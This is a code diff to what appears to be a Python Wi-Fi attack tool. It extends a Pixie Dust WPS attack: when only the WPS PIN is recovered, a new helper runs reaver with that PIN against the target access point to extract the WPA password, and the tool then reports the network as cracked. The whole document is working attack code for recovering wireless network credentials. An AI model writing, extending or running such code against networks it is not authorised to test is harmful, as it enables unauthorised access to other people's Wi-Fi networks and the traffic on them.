@@ -100,13 +100,11 @@ def pixie(mon, target, req, emit, stop_flag):
             m = PSK_RE.search(line)
             if m:
                 psk = m.group(1)
-            if psk is not None or (pin and re.search(r"pixie", line, re.I)
-                                   and "PIN" in line.upper()):
-                cred = psk if psk is not None else pin
-                emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
-                                 credential=cred))
-                result = {"ok": True, "psk": psk, "pin": pin,
-                          "essid": essid, "bssid": bssid}
+            # Full success = we have the PSK. A pixie-recovered PIN alone ends the
+            # loop too, but the PSK is fetched afterwards from the PIN.
+            if psk is not None:
+                break
+            if pin and re.search(r"pixie", line, re.I) and "PIN" in line.upper():
                 break
             if LOCK_RE.search(line) and not ignore_locks:
                 emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
@@ -130,10 +128,66 @@ def pixie(mon, target, req, emit, stop_flag):
                 proc.kill()
             except Exception:  # noqa: BLE001
                 pass
-    # A PIN with no PSK still counts as a crack (credential = pin).
-    if not result["ok"] and pin and psk is None:
+
+    # Got a PIN but not the PSK (the M7 exchange didn't complete). Use the known
+    # PIN to fetch the actual WPA PSK — that's what the PIN is *for*.
+    if pin and psk is None and not (stop_flag and stop_flag.is_set()):
+        emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
+                         phase="GETPSK", countdown=90, cd_max=90,
+                         signal=target.get("signal")))
+        psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag)
+
+    if psk is not None or pin:
+        # PSK = the Wi-Fi password (connectable). PIN alone = not connectable yet.
         emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
-                         credential=pin))
-        result = {"ok": True, "psk": None, "pin": pin,
+                         credential=psk, pin=pin))
+        result = {"ok": True, "psk": psk, "pin": pin,
                   "essid": essid, "bssid": bssid}
     return result
+
+
+def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag, timeout=90):
+    """Recover the WPA PSK from a known WPS PIN: `reaver -p <pin>` does one WPS
+    registration and prints the PSK. Returns the PSK string or None."""
+    if not tools.tool_ok(tools.REAVER):
+        return None
+    cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin), "-vv"]
+    if target.get("channel"):
+        cmd += ["-c", str(target["channel"])]
+    tools.log("wps psk-recover: %s" % " ".join(cmd))
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT, bufsize=1, text=True)
+    except Exception:  # noqa: BLE001
+        return None
+    start = time.time()
+    psk = None
+    fd = proc.stdout.fileno()
+    try:
+        while (time.time() - start) < timeout:
+            if stop_flag and stop_flag.is_set():
+                break
+            ready, _, _ = select.select([fd], [], [], 0.5)
+            if not ready:
+                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
+                                 phase="GETPSK",
+                                 countdown=max(0, int(timeout - (time.time() - start))),
+                                 cd_max=timeout))
+                continue
+            line = proc.stdout.readline()
+            if not line:
+                break
+            m = PSK_RE.search(line)
+            if m:
+                psk = m.group(1)
+                break
+    finally:
+        try:
+            proc.terminate()
+            proc.wait(timeout=3)
+        except Exception:  # noqa: BLE001
+            try:
+                proc.kill()
+            except Exception:  # noqa: BLE001
+                pass
+    return psk
